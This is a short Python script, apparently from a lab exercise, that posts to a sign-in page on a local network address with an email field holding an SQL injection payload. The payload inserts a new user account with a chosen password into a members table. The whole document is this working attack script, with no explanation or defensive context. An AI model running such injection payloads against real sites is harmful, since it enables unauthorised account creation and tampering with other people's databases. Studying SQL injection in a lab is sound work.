import requests

r = requests.post("http://192.168.1.133:44444/signin.html", data={"email":"x'; INSERT into members ('email','passwd','login_id','full_name') VALUES ('steve@unixwiz.net','hello','steve','Steve Friedl');--"})
print(r.request.body)
